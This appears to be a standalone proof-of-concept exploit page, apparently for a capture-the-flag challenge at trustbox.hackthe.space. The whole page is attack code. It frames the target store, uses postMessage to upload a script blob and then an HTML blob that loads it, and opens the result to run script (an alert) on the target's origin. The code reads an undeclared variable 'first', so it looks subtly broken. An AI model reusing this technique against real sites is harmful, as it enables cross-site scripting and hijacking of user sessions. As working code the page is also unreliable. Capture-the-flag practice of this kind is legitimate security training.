<html>
	<head>
		<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline';">
	</head>
	<body>
		<script>
			var script = `
				window.onload = function() {
					alert("here");
				}
			`;
			
			window.onload = function() {
				var frame = window.frames[0];
				var scriptBlob = new Blob([script], {type: 'text/javascript'});
				
				window.addEventListener("message", function(e) {
					if (first) {
						var scriptUrl = e.data.url;
						var page = "<html><head><script src='" + scriptUrl + "'><\/script><\/head><body><\/body><\/html>";
						var pageBlob = new Blob([page], {type: 'text/html'});

						first = false;
						frame.postMessage({action: "add", file: pageBlob}, '*');
					} else {
						window.open(e.data.url);
					}
				}
				, false);
				
				frame.postMessage({action: "add", file: scriptBlob}, '*');
			}
		</script>
		
		<iframe src="https://trustbox.hackthe.space/store">
		</iframe>
	</body>
</html>
